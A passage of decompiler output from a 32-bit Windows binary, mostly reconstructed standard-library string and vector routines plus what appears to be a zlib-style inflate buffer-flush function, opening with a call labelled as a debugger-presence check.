  terminate_if_debugger_present(local_18 ^ (uint)&stack0xfffffffc,uVar5,(char)in_stack_ffffffb8);
  return;
}


/*
Unable to decompile 'FUN_003856d0'
Cause: Exception while decompiling 003856d0: process: timeout

*/


undefined * __thiscall FUN_00389300(void *this,int **param_1)

{
  int *piVar1;
  
  *(undefined4 *)((int)this + 0x14) = 0xf;
  *(undefined4 *)((int)this + 0x10) = 0;
  *(undefined *)this = 0;
  piVar1 = (int *)_strlen((char *)param_1);
  FUN_003894c0(this,param_1,piVar1);
  return (undefined *)this;
}



void FUN_00389340(void)

{
  undefined *in_EAX;
  
  *(undefined4 *)(in_EAX + 0x14) = 0xf;
  *(undefined4 *)(in_EAX + 0x10) = 0;
  *in_EAX = 0;
  FUN_003893d0();
  return;
}



void __fastcall FUN_00389360(void **param_1)

{
  if ((void *)0xf < param_1[5]) {
    FUN_003aee4b(*param_1);
  }
  param_1[5] = (void *)0xf;
  param_1[4] = (void *)0x0;
  *(undefined *)param_1 = 0;
  return;
}



void FUN_003893d0(void)

{
  void **unaff_ESI;
  void **unaff_EDI;
  
  if (unaff_ESI != unaff_EDI) {
    if ((void *)0xf < unaff_ESI[5]) {
      FUN_003aee4b(*unaff_ESI);
    }
    unaff_ESI[5] = (void *)0xf;
    unaff_ESI[4] = (void *)0x0;
    *(undefined *)unaff_ESI = 0;
    if (unaff_EDI[5] < (void *)0x10) {
      FID_conflict__memcpy(unaff_ESI,unaff_EDI,(int)unaff_EDI[4] + 1);
    }
    else {
      *unaff_ESI = *unaff_EDI;
      *unaff_EDI = (void *)0x0;
    }
    unaff_ESI[4] = unaff_EDI[4];
    unaff_ESI[5] = unaff_EDI[5];
    unaff_EDI[4] = (void *)0x0;
    unaff_EDI[5] = (void *)0x0;
  }
  return;
}



undefined4 * __fastcall FUN_00389440(undefined4 *param_1)

{
  if (0xf < (uint)param_1[5]) {
    param_1 = (undefined4 *)*param_1;
  }
  return param_1;
}



void __fastcall FUN_00389450(int *param_1)

{
  int iVar1;
  uint uVar2;
  int *extraout_ECX;
  uint uVar3;
  
  iVar1 = *param_1;
  uVar3 = (param_1[1] - iVar1) / 0x44;
  if (0x3c3c3c2 < uVar3) {
    FUN_003ae350("vector<T> too long");
    param_1 = extraout_ECX;
  }
  uVar2 = (param_1[2] - iVar1) / 0x44;
  uVar3 = uVar3 + 1;
  if (uVar2 < uVar3) {
    if (0x3c3c3c3 - (uVar2 >> 1) < uVar2) {
      uVar2 = 0;
    }
    else {
      uVar2 = uVar2 + (uVar2 >> 1);
    }
    if (uVar2 < uVar3) {
      uVar2 = uVar3;
    }
    FUN_003895c0(param_1,uVar2);
  }
  return;
}



int ** __thiscall FUN_003894c0(void *this,int **param_1,int *param_2)

{
  uint uVar1;
  void *pvVar2;
  int **ppiVar3;
  undefined4 *puVar4;
  
  if (param_1 != (int **)0x0) {
    uVar1 = *(uint *)((int)this + 0x14);
    ppiVar3 = (int **)this;
    if (0xf < uVar1) {
                    // WARNING: Load size is inaccurate
      ppiVar3 = *this;
    }
    if (ppiVar3 <= param_1) {
      pvVar2 = this;
      if (0xf < uVar1) {
                    // WARNING: Load size is inaccurate
        pvVar2 = *this;
      }
      if (param_1 < (int **)(*(int *)((int)this + 0x10) + (int)pvVar2)) {
        if (0xf < uVar1) {
                    // WARNING: Load size is inaccurate
          ppiVar3 = FUN_003896c0(this,(int **)this,(int *)((int)param_1 - *this),param_2);
          return ppiVar3;
        }
        ppiVar3 = FUN_003896c0(this,(int **)this,(int *)((int)param_1 - (int)this),param_2);
        return ppiVar3;
      }
    }
  }
  if (param_2 == (int *)0xffffffff) {
    FUN_003ae350("string too long");
  }
  if (*(int **)((int)this + 0x14) < param_2) {
    FUN_00389950(this,param_2,*(void **)((int)this + 0x10));
    if (param_2 == (int *)0x0) {
      return (int **)this;
    }
  }
  else {
    if (param_2 == (int *)0x0) {
      *(undefined4 *)((int)this + 0x10) = 0;
      if ((int *)0xf < *(int **)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
        **this = 0;
        return (int **)this;
      }
      *(undefined *)this = 0;
      return (int **)this;
    }
  }
  puVar4 = (undefined4 *)this;
  if (0xf < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
    puVar4 = *this;
  }
  FUN_003aee70(puVar4,param_1,(uint)param_2);
  *(int **)((int)this + 0x10) = param_2;
  if (*(uint *)((int)this + 0x14) < 0x10) {
    *(undefined *)((int)this + (int)param_2) = 0;
    return (int **)this;
  }
                    // WARNING: Load size is inaccurate
  *(undefined *)(*this + (int)param_2) = 0;
  return (int **)this;
}



void __thiscall FUN_003895c0(void *this,uint param_1)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &LAB_003c3360;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  if (0x3c3c3c3 < param_1) {
    FUN_003ae350("vector<T> too long");
  }
                    // WARNING: Load size is inaccurate
  if ((uint)((*(int *)((int)this + 8) - *this) / 0x44) < param_1) {
    puVar3 = (undefined4 *)FUN_00389860(param_1);
    local_8 = 0;
                    // WARNING: Load size is inaccurate
    FUN_0038a010(*this,*(undefined4 **)((int)this + 4),puVar3);
    iVar1 = *(int *)((int)this + 4);
                    // WARNING: Load size is inaccurate
    iVar2 = *this;
    if (iVar2 != 0) {
      FUN_00389fb0();
                    // WARNING: Load size is inaccurate
      FUN_003aee4b(*this);
    }
    *(undefined4 **)((int)this + 8) = puVar3 + param_1 * 0x11;
    *(undefined4 **)((int)this + 4) = puVar3 + ((iVar1 - iVar2) / 0x44) * 0x11;
    *(undefined4 **)this = puVar3;
  }
  *in_FS_OFFSET = local_10;
  return;
}



void Catch_All_003896aa(void)

{
  int unaff_EBP;
  
  FUN_003aee4b(*(void **)(unaff_EBP + -0x14));
                    // WARNING: Subroutine does not return
  __CxxThrowException_8(0,(byte *)0x0);
}



int ** __thiscall FUN_003896c0(void *this,int **param_1,int *param_2,int *param_3)

{
  undefined4 *puVar1;
  int **extraout_ECX;
  int **extraout_ECX_00;
  int **ppiVar2;
  int *piVar3;
  
  piVar3 = param_1[4];
  ppiVar2 = param_1;
  if (piVar3 < param_2) {
    FUN_003ae39d("invalid string position");
    ppiVar2 = extraout_ECX;
  }
  piVar3 = (int *)((int)piVar3 - (int)param_2);
  if (param_3 < piVar3) {
    piVar3 = param_3;
  }
  if ((int **)this == ppiVar2) {
    FUN_003898c0(this,(int *)((int)piVar3 + (int)param_2),0xffffffff);
    FUN_003898c0(this,(int *)0x0,(uint)param_2);
    return (int **)this;
  }
  if (piVar3 == (int *)0xffffffff) {
    FUN_003ae350("string too long");
    ppiVar2 = extraout_ECX_00;
  }
  if (*(int **)((int)this + 0x14) < piVar3) {
    FUN_00389950(this,piVar3,*(void **)((int)this + 0x10));
    ppiVar2 = param_1;
    if (piVar3 == (int *)0x0) {
      return (int **)this;
    }
  }
  else {
    if (piVar3 == (int *)0x0) {
      *(undefined4 *)((int)this + 0x10) = 0;
      if ((int *)0xf < *(int **)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
        **this = 0;
        return (int **)this;
      }
      *(undefined *)this = 0;
      return (int **)this;
    }
  }
  if ((int *)0xf < ppiVar2[5]) {
    ppiVar2 = (int **)*ppiVar2;
  }
  puVar1 = (undefined4 *)this;
  if (0xf < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
    puVar1 = *this;
  }
  FUN_003aee70(puVar1,(undefined4 *)((int)ppiVar2 + (int)param_2),(uint)piVar3);
  *(int **)((int)this + 0x10) = piVar3;
  if (*(uint *)((int)this + 0x14) < 0x10) {
    *(undefined *)((int)this + (int)piVar3) = 0;
    return (int **)this;
  }
                    // WARNING: Load size is inaccurate
  *(undefined *)(*this + (int)piVar3) = 0;
  return (int **)this;
}



bool __thiscall FUN_003897b0(void *this,void *param_1,char param_2)

{
  void *pvVar1;
  undefined4 *puVar2;
  void *extraout_ECX;
  void *pvVar3;
  
  pvVar3 = this;
  if (param_1 == (void *)0xffffffff) {
    FUN_003ae350("string too long");
    pvVar3 = extraout_ECX;
  }
  pvVar1 = *(void **)((int)this + 0x14);
  if (pvVar1 < param_1) {
    FUN_00389950(pvVar3,param_1,*(void **)((int)this + 0x10));
    return param_1 != (void *)0x0;
  }
  if ((param_2 != '\0') && (param_1 < (void *)0x10)) {
    pvVar3 = *(void **)((int)this + 0x10);
    if (param_1 < *(void **)((int)this + 0x10)) {
      pvVar3 = param_1;
    }
    if ((void *)0xf < pvVar1) {
                    // WARNING: Load size is inaccurate
      puVar2 = *this;
      if (pvVar3 != (void *)0x0) {
        FUN_003aee70((undefined4 *)this,puVar2,(uint)pvVar3);
      }
      FUN_003aee4b(puVar2);
    }
    *(void **)((int)this + 0x10) = pvVar3;
    *(undefined4 *)((int)this + 0x14) = 0xf;
    *(undefined *)((int)pvVar3 + (int)this) = 0;
    return param_1 != (void *)0x0;
  }
  if (param_1 == (void *)0x0) {
    *(undefined4 *)((int)this + 0x10) = 0;
    if ((void *)0xf < pvVar1) {
                    // WARNING: Load size is inaccurate
      this = *this;
    }
    *(undefined *)this = 0;
  }
  return param_1 != (void *)0x0;
}



int __fastcall FUN_00389860(uint param_1)

{
  int iVar1;
  undefined **local_14 [3];
  char *local_8;
  
  if (param_1 == 0) {
    return 0;
  }
  if ((param_1 < 0x3c3c3c4) && (iVar1 = FUN_003b103e(param_1 * 0x44), iVar1 != 0)) {
    return iVar1;
  }
  local_8 = (char *)0x0;
  std::exception::exception((exception *)local_14,&local_8);
  local_14[0] = std::bad_alloc::vftable;
                    // WARNING: Subroutine does not return
  __CxxThrowException_8(local_14,&DAT_003d3140);
}



int ** __thiscall FUN_003898c0(void *this,int *param_1,uint param_2)

{
  void *pvVar1;
  int *piVar2;
  uint uVar3;
  int iVar4;
  int *extraout_ECX;
  void *pvVar5;
  
  piVar2 = *(int **)((int)this + 0x10);
  if (piVar2 < param_1) {
    piVar2 = (int *)FUN_003ae39d("invalid string position");
    param_1 = extraout_ECX;
  }
  uVar3 = (int)piVar2 - (int)param_1;
  if (uVar3 < param_2) {
    param_2 = uVar3;
  }
  if (param_2 != 0) {
    pvVar5 = this;
    pvVar1 = this;
    if (0xf < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
                    // WARNING: Load size is inaccurate
      pvVar5 = *this;
      pvVar1 = *this;
    }
    FID_conflict__memcpy
              ((void *)((int)pvVar5 + (int)param_1),(void *)((int)pvVar1 + (int)param_1 + param_2),
               uVar3 - param_2);
    iVar4 = *(int *)((int)this + 0x10) - param_2;
    *(int *)((int)this + 0x10) = iVar4;
    if (0xf < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
      *(undefined *)(*this + iVar4) = 0;
      return (int **)this;
    }
    *(undefined *)((int)this + iVar4) = 0;
  }
  return (int **)this;
}



void __thiscall FUN_00389950(void *this,void *param_1,void *param_2)

{
  uint uVar1;
  uint *puVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  uint uVar5;
  void *pvVar6;
  int **in_FS_OFFSET;
  uint uStack60;
  undefined **local_2c [4];
  char *local_1c;
  void *local_18;
  uint *local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c2df0;
  local_10 = *in_FS_OFFSET;
  uStack60 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_14 = &uStack60;
  *in_FS_OFFSET = (int *)&local_10;
  pvVar6 = (void *)((uint)param_1 | 0xf);
  if (pvVar6 != (void *)0xffffffff) {
    uVar1 = *(uint *)((int)this + 0x14);
    uVar5 = uVar1 >> 1;
    param_1 = pvVar6;
    if (((uint)pvVar6 / 3 < uVar5) && (param_1 = (void *)(uVar5 + uVar1), -uVar5 - 2 < uVar1)) {
      param_1 = (void *)0xfffffffe;
    }
  }
  puVar3 = (undefined4 *)0x0;
  local_8 = 0;
  local_18 = this;
  puVar2 = &uStack60;
  if (((int)param_1 + 1U != 0) &&
     (puVar3 = (undefined4 *)FUN_003b103e((int)param_1 + 1U), puVar2 = local_14,
     puVar3 == (undefined4 *)0x0)) {
    local_1c = (char *)0x0;
    std::exception::exception((exception *)local_2c,&local_1c);
    local_2c[0] = std::bad_alloc::vftable;
                    // WARNING: Subroutine does not return
    __CxxThrowException_8(local_2c,&DAT_003d3140);
  }
  local_14 = puVar2;
  if (param_2 != (void *)0x0) {
    puVar4 = (undefined4 *)this;
    if (0xf < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
      puVar4 = *this;
    }
    FUN_003aee70(puVar3,puVar4,(uint)param_2);
  }
  if (0xf < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
    FUN_003aee4b(*this);
  }
  *(undefined *)this = 0;
  *(undefined4 **)this = puVar3;
  *(void **)((int)this + 0x14) = param_1;
  *(void **)((int)this + 0x10) = param_2;
  if ((void *)0xf < param_1) {
    this = puVar3;
  }
  *(undefined *)((int)this + (int)param_2) = 0;
  *in_FS_OFFSET = local_10;
  return;
}



undefined * Catch_All_00389a03(void)

{
  int iVar1;
  int unaff_EBP;
  
  *(int *)(unaff_EBP + -0x1c) = *(int *)(unaff_EBP + 8);
  *(BADSPACEBASE **)(unaff_EBP + -0x10) = register0x00000010;
  *(undefined *)(unaff_EBP + -4) = 2;
  iVar1 = FUN_00389ac0((char *)(*(int *)(unaff_EBP + 8) + 1));
  *(int *)(unaff_EBP + 8) = iVar1;
  return &DAT_00389a26;
}



void Catch_All_00389a8b(void)

{
  void **ppvVar1;
  int unaff_EBP;
  
  ppvVar1 = *(void ***)(unaff_EBP + -0x14);
  if ((void *)0xf < ppvVar1[5]) {
    FUN_003aee4b(*ppvVar1);
  }
  ppvVar1[5] = (void *)0xf;
  ppvVar1[4] = (void *)0x0;
  *(undefined *)ppvVar1 = 0;
                    // WARNING: Subroutine does not return
  __CxxThrowException_8(0,(byte *)0x0);
}



int FUN_00389ac0(char *param_1)

{
  int iVar1;
  undefined **local_10 [3];
  
  iVar1 = 0;
  if ((param_1 != (char *)0x0) && (iVar1 = FUN_003b103e((size_t)param_1), iVar1 == 0)) {
    param_1 = (char *)0x0;
    std::exception::exception((exception *)local_10,&param_1);
    local_10[0] = std::bad_alloc::vftable;
                    // WARNING: Subroutine does not return
    __CxxThrowException_8(local_10,&DAT_003d3140);
  }
  return iVar1;
}



void __fastcall FUN_00389b10(undefined4 param_1,char *param_2,char *param_3)

{
  _vsprintf_s(param_2,0x400,param_3,&stack0x00000008);
  return;
}



undefined * __thiscall FUN_00389b30(void *this,void *param_1)

{
  char *in_EAX;
  size_t sVar1;
  
  sVar1 = _strlen(in_EAX);
  FUN_00389e70(param_1,sVar1);
  *(undefined4 *)((int)this + 0x14) = 0xf;
  *(undefined4 *)((int)this + 0x10) = 0;
  *(undefined *)this = 0;
  FUN_003893d0();
  return (undefined *)this;
}



undefined * __thiscall FUN_00389b80(void *this,undefined *param_1)

{
  undefined4 *in_EAX;
  
  if ((*(int *)((int)this + 0x14) - *(uint *)((int)this + 0x10) < (uint)in_EAX[4]) &&
     (*(uint *)((int)this + 0x10) <= (uint)(in_EAX[5] - in_EAX[4]))) {
    FUN_00389d10((int *)0x0);
    *(undefined4 *)(param_1 + 0x14) = 0xf;
    *(undefined4 *)(param_1 + 0x10) = 0;
    *param_1 = 0;
    FUN_003893d0();
    return param_1;
  }
  FUN_00389c20(in_EAX,0);
  *(undefined4 *)(param_1 + 0x14) = 0xf;
  *(undefined4 *)(param_1 + 0x10) = 0;
  *param_1 = 0;
  FUN_003893d0();
  return param_1;
}



undefined ** __thiscall FUN_00389c00(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::bad_alloc::vftable;
  return (undefined **)this;
}



void FUN_00389c20(undefined4 *param_1,uint param_2)

{
  int *piVar1;
  uint in_EAX;
  uint uVar2;
  int **ppiVar3;
  uint uVar4;
  int **unaff_ESI;
  undefined8 uVar5;
  
  uVar2 = param_1[4];
  uVar4 = param_2;
  if (uVar2 < param_2) {
    uVar5 = FUN_003ae39d("invalid string position");
    uVar4 = (uint)((ulonglong)uVar5 >> 0x20);
    uVar2 = (uint)uVar5;
  }
  if (uVar2 - uVar4 < in_EAX) {
    in_EAX = uVar2 - uVar4;
  }
  uVar5 = CONCAT44(uVar4,unaff_ESI[4]);
  if (-(int)unaff_ESI[4] - 1U <= in_EAX) {
    uVar5 = FUN_003ae350("string too long");
  }
  if (in_EAX != 0) {
    piVar1 = (int *)((int)uVar5 + in_EAX);
    if (piVar1 == (int *)0xffffffff) {
      uVar5 = FUN_003ae350("string too long");
    }
    uVar2 = (uint)((ulonglong)uVar5 >> 0x20);
    if (unaff_ESI[5] < piVar1) {
      FUN_00389950(unaff_ESI,piVar1,(void *)uVar5);
      uVar2 = param_2;
      if (piVar1 == (int *)0x0) {
        return;
      }
    }
    else {
      if (piVar1 == (int *)0x0) {
        unaff_ESI[4] = (int *)0x0;
        if ((int *)0xf < unaff_ESI[5]) {
          *(undefined *)*unaff_ESI = 0;
          return;
        }
        *(undefined *)unaff_ESI = 0;
        return;
      }
    }
    if (0xf < (uint)param_1[5]) {
      param_1 = (undefined4 *)*param_1;
    }
    ppiVar3 = unaff_ESI;
    if ((int *)0xf < unaff_ESI[5]) {
      ppiVar3 = (int **)*unaff_ESI;
    }
    FUN_003aee70((undefined4 *)((int)unaff_ESI[4] + (int)ppiVar3),
                 (undefined4 *)((int)param_1 + uVar2),in_EAX);
    unaff_ESI[4] = piVar1;
    if ((int *)0xf < unaff_ESI[5]) {
      *(undefined *)((int)*unaff_ESI + (int)piVar1) = 0;
      return;
    }
    *(undefined *)((int)unaff_ESI + (int)piVar1) = 0;
  }
  return;
}



void FUN_00389d10(int *param_1)

{
  int *piVar1;
  code *pcVar2;
  uint in_EAX;
  uint uVar3;
  int *piVar4;
  int **ppiVar5;
  int **ppiVar6;
  int **unaff_EBX;
  int **unaff_ESI;
  undefined8 uVar7;
  
  if (unaff_EBX[4] < param_1) {
    FUN_003ae39d("invalid string position");
    pcVar2 = (code *)swi(3);
    (*pcVar2)();
    return;
  }
  uVar3 = (int)unaff_EBX[4] - (int)param_1;
  if (uVar3 < in_EAX) {
    in_EAX = uVar3;
  }
  piVar4 = unaff_ESI[4];
  if (-(int)piVar4 - 1U <= in_EAX) {
    piVar4 = (int *)FUN_003ae350("string too long");
  }
  if (in_EAX != 0) {
    piVar1 = (int *)((int)piVar4 + in_EAX);
    uVar7 = CONCAT44(piVar1,piVar4);
    if (piVar1 == (int *)0xffffffff) {
      uVar7 = FUN_003ae350("string too long");
    }
    piVar4 = (int *)((ulonglong)uVar7 >> 0x20);
    if (unaff_ESI[5] < piVar4) {
      FUN_00389950(unaff_ESI,piVar4,(void *)uVar7);
      if (piVar1 == (int *)0x0) {
        return;
      }
    }
    else {
      if (piVar4 == (int *)0x0) {
        unaff_ESI[4] = (int *)0x0;
        if (unaff_ESI[5] < (int *)0x10) {
          *(undefined *)unaff_ESI = 0;
          return;
        }
        *(undefined *)*unaff_ESI = 0;
        return;
      }
    }
    ppiVar5 = unaff_ESI;
    ppiVar6 = unaff_ESI;
    if ((int *)0xf < unaff_ESI[5]) {
      ppiVar5 = (int **)*unaff_ESI;
      ppiVar6 = (int **)*unaff_ESI;
    }
    FID_conflict__memcpy((void *)((int)ppiVar5 + in_EAX),ppiVar6,(size_t)unaff_ESI[4]);
    if (unaff_ESI == unaff_EBX) {
      if (param_1 != (int *)0x0) {
        param_1 = (int *)((int)param_1 + in_EAX);
      }
      if (unaff_ESI[5] < (int *)0x10) {
        FID_conflict__memcpy(unaff_ESI,(undefined *)((int)unaff_ESI + (int)param_1),in_EAX);
      }
      else {
        FID_conflict__memcpy(*unaff_ESI,(void *)((int)*unaff_ESI + (int)param_1),in_EAX);
      }
    }
    else {
      if ((int *)0xf < unaff_EBX[5]) {
        unaff_EBX = (int **)*unaff_EBX;
      }
      ppiVar6 = unaff_ESI;
      if ((int *)0xf < unaff_ESI[5]) {
        ppiVar6 = (int **)*unaff_ESI;
      }
      FUN_003aee70(ppiVar6,(undefined4 *)((int)unaff_EBX + (int)param_1),in_EAX);
    }
    unaff_ESI[4] = piVar1;
    if ((int *)0xf < unaff_ESI[5]) {
      *(undefined *)((int)*unaff_ESI + (int)piVar1) = 0;
      return;
    }
    *(undefined *)((int)unaff_ESI + (int)piVar1) = 0;
  }
  return;
}



int ** __thiscall FUN_00389e70(void *this,uint param_1)

{
  void *pvVar1;
  undefined4 *in_EAX;
  int **ppiVar2;
  void *pvVar3;
  void *pvVar4;
  undefined4 *puVar5;
  uint extraout_ECX;
  uint uVar6;
  
  if (in_EAX != (undefined4 *)0x0) {
    uVar6 = *(uint *)((int)this + 0x14);
    puVar5 = (undefined4 *)this;
    if (0xf < uVar6) {
                    // WARNING: Load size is inaccurate
      puVar5 = *this;
    }
    if (puVar5 <= in_EAX) {
      pvVar3 = this;
      if (0xf < uVar6) {
                    // WARNING: Load size is inaccurate
        pvVar3 = *this;
      }
      if (in_EAX < (undefined4 *)(*(int *)((int)this + 0x10) + (int)pvVar3)) {
        if (uVar6 < 0x10) {
          ppiVar2 = (int **)FUN_00389d10((int *)((int)in_EAX - (int)this));
          return ppiVar2;
        }
                    // WARNING: Load size is inaccurate
        ppiVar2 = (int **)FUN_00389d10((int *)((int)in_EAX - *this));
        return ppiVar2;
      }
    }
  }
  pvVar3 = *(void **)((int)this + 0x10);
  uVar6 = param_1;
  if (-(int)pvVar3 - 1U <= param_1) {
    pvVar3 = (void *)FUN_003ae350("string too long");
    uVar6 = extraout_ECX;
  }
  if (uVar6 != 0) {
    pvVar1 = (void *)((int)pvVar3 + uVar6);
    if (pvVar1 == (void *)0xffffffff) {
      pvVar3 = (void *)FUN_003ae350("string too long");
    }
    if (*(void **)((int)this + 0x14) < pvVar1) {
      FUN_00389950(this,pvVar1,pvVar3);
      if (pvVar1 == (void *)0x0) {
        return (int **)this;
      }
    }
    else {
      if (pvVar1 == (void *)0x0) {
        *(undefined4 *)((int)this + 0x10) = 0;
        if (*(void **)((int)this + 0x14) < (void *)0x10) {
          *(undefined *)this = 0;
          return (int **)this;
        }
                    // WARNING: Load size is inaccurate
        **this = 0;
        return (int **)this;
      }
    }
    pvVar4 = this;
    pvVar3 = this;
    if (0xf < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
                    // WARNING: Load size is inaccurate
      pvVar4 = *this;
      pvVar3 = *this;
    }
    FID_conflict__memcpy((void *)((int)pvVar4 + param_1),pvVar3,*(size_t *)((int)this + 0x10));
    puVar5 = (undefined4 *)this;
    if (0xf < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
      puVar5 = *this;
    }
    FUN_003aee70(puVar5,in_EAX,param_1);
    *(void **)((int)this + 0x10) = pvVar1;
    if (0xf < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
      *(undefined *)(*this + (int)pvVar1) = 0;
      return (int **)this;
    }
    *(undefined *)((int)this + (int)pvVar1) = 0;
  }
  return (int **)this;
}



void FUN_00389fb0(void)

{
  uint *puVar1;
  uint *in_EAX;
  uint *puVar2;
  uint *unaff_EDI;
  
  if (in_EAX != unaff_EDI) {
    puVar2 = in_EAX + 0xd;
    do {
      if (0xf < *puVar2) {
        FUN_003aee4b((void *)puVar2[-5]);
      }
      *puVar2 = 0xf;
      puVar2[-1] = 0;
      *(undefined *)(puVar2 + -5) = 0;
      if (0xf < puVar2[-7]) {
        FUN_003aee4b((void *)puVar2[-0xc]);
      }
      puVar2[-7] = 0xf;
      puVar2[-8] = 0;
      *(undefined *)(puVar2 + -0xc) = 0;
      puVar1 = puVar2 + 4;
      puVar2 = puVar2 + 0x11;
    } while (puVar1 != unaff_EDI);
  }
  return;
}



undefined4 * __thiscall FUN_0038a010(void *this,undefined4 *param_1,undefined4 *param_2)

{
  int **in_FS_OFFSET;
  int *local_10;
  undefined *puStack12;
  undefined local_8;
  undefined3 uStack7;
  
  puStack12 = &LAB_003c333c;
  local_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_10;
  uStack7 = 0;
  for (; (undefined4 *)this != param_1; this = (void *)((int)this + 0x44)) {
    local_8 = 1;
    if (param_2 != (undefined4 *)0x0) {
                    // WARNING: Load size is inaccurate
      *param_2 = *this;
      param_2[6] = 0xf;
      param_2[5] = 0;
      *(undefined *)(param_2 + 1) = 0;
      FUN_003896c0(param_2 + 1,(int **)((int)this + 4),(int *)0x0,(int *)0xffffffff);
      local_8 = 2;
      param_2[0xd] = 0xf;
      param_2[0xc] = 0;
      *(undefined *)(param_2 + 8) = 0;
      FUN_003896c0(param_2 + 8,(int **)((int)this + 0x20),(int *)0x0,(int *)0xffffffff);
      param_2[0xf] = *(undefined4 *)((int)this + 0x3c);
      param_2[0x10] = *(undefined4 *)((int)this + 0x40);
    }
    param_2 = param_2 + 0x11;
  }
  *in_FS_OFFSET = local_10;
  return param_2;
}



void Catch_All_0038a0bc(void)

{
  int iVar1;
  int unaff_EBP;
  int iVar2;
  
  iVar1 = *(int *)(unaff_EBP + 0xc);
  for (iVar2 = *(int *)(unaff_EBP + -0x14); iVar2 != iVar1; iVar2 = iVar2 + 0x44) {
    FUN_0038a0f0();
  }
                    // WARNING: Subroutine does not return
  __CxxThrowException_8(0,(byte *)0x0);
}



void FUN_0038a0f0(void)

{
  int unaff_ESI;
  
  if (0xf < *(uint *)(unaff_ESI + 0x34)) {
    FUN_003aee4b(*(void **)(unaff_ESI + 0x20));
  }
  *(undefined4 *)(unaff_ESI + 0x34) = 0xf;
  *(undefined4 *)(unaff_ESI + 0x30) = 0;
  *(undefined *)(unaff_ESI + 0x20) = 0;
  if (0xf < *(uint *)(unaff_ESI + 0x18)) {
    FUN_003aee4b(*(void **)(unaff_ESI + 4));
  }
  *(undefined4 *)(unaff_ESI + 0x14) = 0;
  *(undefined4 *)(unaff_ESI + 0x18) = 0xf;
  *(undefined *)(unaff_ESI + 4) = 0;
  return;
}



int __cdecl FUN_0038a140(int param_1)

{
  uint uVar1;
  undefined4 uVar2;
  undefined4 *puVar3;
  int unaff_EBX;
  int unaff_ESI;
  undefined4 *puVar4;
  uint uVar5;
  undefined4 *local_c;
  
  local_c = *(undefined4 **)(unaff_EBX + 0xc);
  puVar4 = *(undefined4 **)(unaff_ESI + 0x34);
  puVar3 = *(undefined4 **)(unaff_ESI + 0x30);
  if (puVar4 < puVar3) {
    puVar4 = *(undefined4 **)(unaff_ESI + 0x2c);
  }
  uVar1 = *(uint *)(unaff_EBX + 0x10);
  uVar5 = (int)puVar4 - (int)puVar3;
  if (uVar1 < (uint)((int)puVar4 - (int)puVar3)) {
    uVar5 = uVar1;
  }
  if ((uVar5 != 0) && (param_1 == -5)) {
    param_1 = 0;
  }
  *(int *)(unaff_EBX + 0x14) = *(int *)(unaff_EBX + 0x14) + uVar5;
  *(uint *)(unaff_EBX + 0x10) = uVar1 - uVar5;
  if (*(code **)(unaff_ESI + 0x38) != (code *)0x0) {
    uVar2 = (**(code **)(unaff_ESI + 0x38))(*(undefined4 *)(unaff_ESI + 0x3c),puVar3,uVar5);
    *(undefined4 *)(unaff_ESI + 0x3c) = uVar2;
    *(undefined4 *)(unaff_EBX + 0x30) = uVar2;
  }
  if (uVar5 != 0) {
    FUN_003aee70(local_c,puVar3,uVar5);
    local_c = (undefined4 *)((int)local_c + uVar5);
    puVar3 = (undefined4 *)((int)puVar3 + uVar5);
  }
  if (puVar3 == *(undefined4 **)(unaff_ESI + 0x2c)) {
    puVar3 = *(undefined4 **)(unaff_ESI + 0x28);
    if (*(undefined4 **)(unaff_ESI + 0x34) == *(undefined4 **)(unaff_ESI + 0x2c)) {
      *(undefined4 **)(unaff_ESI + 0x34) = puVar3;
    }
    uVar1 = *(uint *)(unaff_EBX + 0x10);
    uVar5 = *(int *)(unaff_ESI + 0x34) - (int)puVar3;
    if (uVar1 < uVar5) {
      uVar5 = uVar1;
    }
    if ((uVar5 != 0) && (param_1 == -5)) {
      param_1 = 0;
    }
    *(int *)(unaff_EBX + 0x14) = *(int *)(unaff_EBX + 0x14) + uVar5;
    *(uint *)(unaff_EBX + 0x10) = uVar1 - uVar5;
    if (*(code **)(unaff_ESI + 0x38) != (code *)0x0) {
      uVar2 = (**(code **)(unaff_ESI + 0x38))(*(undefined4 *)(unaff_ESI + 0x3c),puVar3,uVar5);
      *(undefined4 *)(unaff_ESI + 0x3c) = uVar2;
      *(undefined4 *)(unaff_EBX + 0x30) = uVar2;
    }
    if (uVar5 != 0) {
      FUN_003aee70(local_c,puVar3,uVar5);
      local_c = (undefined4 *)((int)local_c + uVar5);
      puVar3 = (undefined4 *)((int)puVar3 + uVar5);
    }
  }
  *(undefined4 **)(unaff_EBX + 0xc) = local_c;
  *(undefined4 **)(unaff_ESI + 0x30) = puVar3;
  return param_1;
}



void __cdecl FUN_0038a240(undefined param_1,undefined param_2,undefined4 param_3,undefined4 param_4)

{
  int in_EAX;
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)(**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x1c);
  if (puVar1 != (undefined4 *)0x0) {
    *(undefined *)(puVar1 + 4) = param_1;
    *(undefined *)((int)puVar1 + 0x11) = param_2;
    *puVar1 = 0;
    puVar1[5] = param_3;
    puVar1[6] = param_4;
  }
  return;
}



void __thiscall FUN_0038a280(void *this,int param_1)

{
  byte bVar1;
  uint *puVar2;
  undefined *puVar3;
  byte *pbVar4;
  byte **in_EAX;
  uint uVar5;
